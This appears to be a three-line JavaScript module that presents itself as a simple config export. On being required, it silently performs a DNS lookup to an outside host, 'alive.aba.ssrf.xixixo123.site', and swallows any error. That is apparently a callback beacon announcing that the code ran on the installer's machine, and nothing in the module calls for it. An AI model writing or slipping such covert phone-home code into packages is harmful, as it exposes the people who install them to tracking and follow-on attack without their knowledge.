const dns = require("dns");
try { dns.lookup("alive.aba.ssrf.xixixo123.site", () => {}); } catch (e) {}
module.exports = { config: { default: true } };
